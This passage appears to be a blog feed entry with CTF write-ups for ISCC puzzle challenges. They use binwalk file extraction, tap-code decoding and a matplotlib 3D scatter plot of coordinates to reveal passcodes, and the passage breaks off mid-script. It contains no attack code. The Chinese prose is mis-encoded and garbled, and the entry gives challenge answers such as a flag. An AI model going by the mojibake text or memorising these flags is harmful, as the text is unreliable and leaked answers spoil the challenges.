    <content type="html"><![CDATA[ <a id="more"></a><h2 id="ç»ƒæ­¦"><a href="#ç»ƒæ­¦" class="headerlink" title="ç»ƒæ­¦"></a>ç»ƒæ­¦</h2><h3 id="æåçš„çº¢åŒ…"><a href="#æåçš„çº¢åŒ…" class="headerlink" title="æåçš„çº¢åŒ…"></a>æåçš„çº¢åŒ…</h3><blockquote><p>é¢˜ç›®æè¿°ï¼š<br>å¤§å¹´åˆä¸€ï¼Œæåç»™çˆ¸çˆ¸æ‹œå¹´ï¼Œä»äº‹è®¡ç®—æœºè¡Œä¸šçš„çˆ¶äº²å‘ç»™æåä¸€å¼ å›¾ç‰‡å’Œä¸€å¼ é“¶è¡Œå¡ã€‚çˆ¶äº²å‘Šè¯‰æåå¯†ç å°±è—åœ¨å›¾ç‰‡ä¸­ï¼Œä½†æ˜¯æåæ‰“å¼€å›¾ç‰‡åå´ç™¾æ€ä¸å¾—å…¶è§£ã€‚ä½ èƒ½å¸®åŠ©æåæ‹¿åˆ°å¯†ç å—ï¼Ÿ</p></blockquote><p>ä¸‹è½½é™„ä»¶ï¼Œ<br><img src="https://img-blog.csdnimg.cn/20210517174752113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥binwalkåˆ†ç¦»å¾—åˆ°hongbao.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">24</span>,<span class="hljs-number">43</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">21</span>,<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure><p>æ²¡å•¥æ€è·¯ï¼Œçœ‹èµ·æ¥å›¾ç‰‡ä¸å®Œå…¨ï¼Œä¿®æ”¹å›¾ç‰‡é«˜åº¦ï¼Œå›¾ç‰‡ä¸‹é¢æœ‰ä¸€ä¸ªé¼“ï¼Œè”æƒ³åˆ°æ•²å‡»ç <br><img src="https://img-blog.csdnimg.cn/20210517175032487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯¹ç…§æ•²å‡»ç è¡¨<br><img src="https://img-blog.csdnimg.cn/20210517175209329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è½¬æ¢å¾—åˆ°<code>ISCCBFS</code>ï¼Œæœ‰ç‚¹å‘ï¼Œè¯´æ˜¯é“¶è¡Œå¡å¯†ç ï¼Œå…¶å®å¹¶ä¸æ˜¯å…­ä½æ•°å­—ï¼Œæœ€ç»ˆflagä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;ISCCBFS&#125;<br></code></pre></td></tr></table></figure><h3 id="Retrieve-the-passcode"><a href="#Retrieve-the-passcode" class="headerlink" title="Retrieve the passcode"></a>Retrieve the passcode</h3><blockquote><p>é¢˜ç›®æè¿°ï¼š<br>Scatterè¯´ä»–èƒ½è§£å¼€è¿™ä¸ªå¤æ€ªçš„å¯†ç ï¼Œä½ å‘¢ï¼Ÿæ¥è¯•è¯•å§ï¼ Flagæ ¼å¼ï¼šISCC{XXX}ï¼ŒXXXä¸ºå°å†™å­—ç¬¦ä¸²ï¼Œä¸åŒ…æ‹¬ç©ºæ ¼</p></blockquote><p>xyz.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ç™¾åº¦æ‰¾åˆ°çš„è„šæœ¬ï¼Œä¿®æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br><br>fig = plt.figure()<br>ax = fig.gca(projection=<span class="hljs-string">&quot;3d&quot;</span>)<br><br><br>xs, ys ,zs= np.loadtxt(<span class="hljs-string">&#x27;xyz.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;:&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>ax.scatter(xs, ys, zs, zdir=<span class="hljs-string">&quot;z&quot;</span>, c=<span class="hljs-string">&quot;#FF5511&quot;</span>, marker=<span class="hljs-string">&quot;o&quot;</span>, s=<span class="hljs-number">40</span>)<br>ax.<span class="hljs-built_in">set</span>(xlabel=<span class="hljs-string">&quot;X&quot;</span>, ylabel=<span class="hljs-string">&quot;Y&quot;</span>, zlabel=<span class="hljs-string">&quot;Z&quot;</span>)<br><br>plt.show()<br></code></pre></td></tr></table></figure><p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20210519181216709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è„šæœ¬2ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br>dot1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span 